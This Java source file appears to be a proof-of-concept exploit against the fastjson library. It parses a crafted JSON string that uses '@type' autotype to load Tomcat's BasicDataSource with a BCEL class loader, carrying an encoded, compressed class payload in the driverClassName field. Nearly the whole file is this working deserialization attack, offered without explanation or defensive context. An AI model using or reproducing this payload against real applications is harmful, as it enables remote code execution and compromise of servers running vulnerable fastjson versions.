package FastJson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class TestCheck {
    public static void main(String[] args) {
        String str = "{\n" +
                "\t{\n" +
                "\t\"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "\t\"x\":{\n" +
                "\t\t\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "\t\t\"driverClassName\":\"$l$8b$I$A$A$A$A$A$A$AmS$5bS$d3$40$U$fe$b6$ad$q$a4$e9$85$o$a0$82$u$dehA$h$V$ef$a0$8cvp$c6$b1X$c62$f8$bc$5dvp1M2$c9$96$c1$7f$e0$3f$f1$Z$l$aa$e3$83$3f$c0$9f$e4$83z60$a5$Md$sg$7b$bes$be$ef$5c6$fd$fd$f7$e7$_$AKx$e6$c0$c5$ec$u$ae$e0$aa$8d9$H$d7p$dd$c6$N$h7$j$dc$c2$bc1U$L5$H$a3X$b0$b0h$e16$c3$c8$8a$K$94$7e$c1$90$ad$d6$b6$Yr$8dp$5b2$94$9a$w$90$efz$dd$8e$8c7y$c7$t$a4$d2$M$F$f7$b7x$ac$8c$7f$E$e6$f4G$950$e4$9b$af$q$P$bc$b5$3d$e5$_3$d8$x$c2$3f$d2d$943$d1$dc$e5$7b$dcS$a1$f7$a6$b5$b6$_d$a4U$YPZVt$b7$8dl$g$f5y$b0$e3$b5u$ac$82$j$K$V$da$9a$8bO$eb$3cJ$cbX$b8CM38$ed$b0$X$L$f9Z$99$ca$a3$a6X$ddp$5d$UP$b4Pw$e1$e1$$$f5$o$c2$m$d1qO$e80$b6p$cf$c5$7d$y$d1$94$89$e6Z$J$86$e7$5e$fbs$a2e$d7$7b$ZE$be$S$dc4$93x$N$ee$8b$9e$cf$89R$e7Q$e45$c2$40$cb$40$t$de$3a$X$ad$f6P$d4$c2$D$X$P$f1$c8$c5c$3ca$Y$3fc2$XOQ$a4$fe$G$ha$u$l$8f$d8$ea$ecJ$a1O$40$87S$9f$84$d2$WiEaO$P$_p$8325$e5K$de$5d$k$aa$3e$E3X$91$f1$fc$80x$d5$d3$bb5W$3cv$8c$be$ef$FZui$9d$ce$8e$d4$Dg$a2Zk$9e$ca$a1$829$b9$_i$85$f3g$e9$OA$hq$ud$92$Q$a1$U$jvF$97$b9$Zs$n1$87$3c$7d$a0$e6$c9$80$99$7b$p$5b$oo5$f5$81$c2$c2w$b0o$c8T$b2$7d$e4$O$d2$b42$d9$o$b2d$cb$c8a$8c$e8$V$b2$a03$r$907N$a7$8d$f3$D$b1$_$c4$ca$d09c$84$ce$91Pe$e4$ed$PX$L$7d$d8$l$be$c2n$$$f6$e1$iPn$9e$98$93$f4W$c8$a65fa$a5$3a6$n$f94V$a4$a8$8b$v$aa1M$ba$a6$e6$q$e9NQ$X$T$f4$cb$f0$cb$e4$5d$m$fc$o$bd$Vd$fe$Z$d8$c2$rc$a6$ffP$k$c3L$3a$c3$e5$ffTn$a5Z$a1$D$A$A\",\n" +
                "\t\t\"driverClassLoader\":{\n" +
                "\t\t\t\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "\t\t}\n" +
                "\t}\n" +
                "}:\"x\"\n" +
                "}\n";
        JSON.parse(str);
    }
}
